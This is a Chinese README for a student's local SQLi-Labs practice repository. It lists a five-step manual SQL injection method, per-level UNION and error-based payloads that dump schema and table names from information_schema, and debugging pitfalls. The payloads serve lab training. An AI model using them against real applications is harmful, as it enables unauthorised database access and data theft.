# SQLi-Labs 手工注入实战练习

基于 SQLi-Labs 复刻版，针对 Less-1 ~ Less-5 手工复盘 5 关字符型/数字型/报错型 SQL 注入。

##  环境信息

| 组件 | 版本 |
|---|---|
| 操作系统 | Windows 10 / 11 |
| Web 集成环境 | phpStudy Pro |
| Apache | 2.4.39 |
| MySQL | 5.7.26 |
| PHP | 7.x |
| 字符集 | utf8 / utf8_general_ci |

##  五步法（手工注入通用流程）

1. **判闭合**：构造 `?id=1' --+` / `?id=1") --+` 看是否正常返回 → 推断闭合符
2. **数列**：用 `?id=-1' ORDER BY N --+` 探测字段数（报错时的 N-1 即所求）
3. **回显位**：`?id=-1' UNION SELECT 1,2,3 --+` 看哪几列被回显
4. **爆库**：`UNION SELECT 1, group_concat(schema_name), 3 FROM information_schema.schemata --+`
5. **拖数据**：从 information_schema 顺藤摸瓜 → 表 → 列 → 数据

##  关卡速览

| 关卡 | 类型 | 闭合符 | 利用手法 | 关键 Payload |
|---|---|---|---|---|
| Less-1 | 字符型 GET | `'` | UNION 回显 | `?id=-1' UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata --+` |
| Less-2 | 数字型 GET | 无 | UNION 回显 | `?id=-1 ORDER BY 3 --+` |
| Less-3 | 字符型 GET | `')` | UNION 回显 | `?id=-1') UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables --+` |
| Less-4 | 字符型 GET | `")` | UNION 回显 | `?id=-1") UNION SELECT 1,2,3 --+` |
| Less-5 | 字符型 GET（无回显） | `'` | 报错注入（updatexml/extractvalue） | `?id=1' AND extractvalue(1,concat(0x7e,database(),0x7e)) --+` |

##  关键陷阱 & 复盘

### 1. MySQL collation 不一致 → UNION 报错

默认 latin1_swedish_ci 的库直接 UNION `information_schema` 表会抛：

```
Illegal mix of collations for operation 'UNION'
```

**解决**：
- 建库时显式指定 `CHARACTER SET utf8 COLLATE utf8_general_ci`
- 表也指定同 collation
- 临时绕：payload 里 `CAST(group_concat(x) AS CHAR)` 强转，但每个 payload 都要加

### 2. 字符串转数字陷阱（最易误判闭合）

单独用 `?id=1' --+` 探测时**不能直接确认闭合成功** —— MySQL 把整段 SQL 隐式转数字成 1，仍匹配 `id=1` 第一行返回看似正常。

`and 1=1 / and 1=2` 在字符串内也**失效**（AND 被吃进字符串）。

**正确判法**：
- 翻代码 / Debug SQL，确认 `id=('1'')` 结构是否完整闭合
- 用 `ORDER BY` 或 `UNION` 报错做**硬证据**（`Unknown column 'N' in 'order clause'` 即为真错）

##  文件结构

```
sqli-labs/
├── README.md                        # 本文件
├── index.php                        # 主页（5 关导航 + 说明）
├── Less-1/index.php                 # 字符型注入（单引号闭合）
├── Less-2/index.php                 # 数字型注入
├── Less-3/index.php                 # 字符型注入（单引号+括号闭合）
├── Less-4/index.php                 # 字符型注入（双引号+括号闭合）
├── Less-5/index.php                 # 报错注入（updatexml / extractvalue）
└── sql-connections/
    ├── db-creds.inc                 # 数据库凭证
    └── setup-db.php                 # 初始化 security 库（建表 + 灌测试数据）
```

##  复现步骤

```bash
1. 启动 phpStudy Pro（Apache + MySQL 均绿）
2. 浏览器访问 http://localhost/sqli-labs/sql-connections/setup-db.php 建库
3. 浏览器访问 http://localhost/sqli-labs/ 进入主页
4. 逐关练习，按五步法走
```

##  后续路线

| 阶段 | 范围 | 技术点 |
|---|---|---|
| 入门（已完成） | Less-1 ~ Less-5 | 字符型/数字型 UNION、报错注入 |
| 进阶 | Less-6 ~ Less-20 | 时间盲注、布尔盲注、POST 注入 |
| 高级 | Less-21 ~ Less-30 | Cookie / Referer / User-Agent 注入 |
| 实战 | Less-31 ~ Less-65 | 堆叠、二次注入、宽字节、头部注入、绕过 WAF |
| 工具化 | sqlmap 自动化 | 复用手工注入理解的 Payload |

每个新关卡都会补 README.md writeup + 复盘。

##  参考

- SQLi-Labs 项目：https://github.com/Audi-1/sqli-labs
- OWASP Top 10 - A03:2021 Injection
- 《白帽子讲 Web 安全》第 4 章「SQL 注入」

---

> 维护：陈霆（黑龙江大学 网络空间安全 · 2027 届）  
> 持续更新中，欢迎复刻、本地练习。
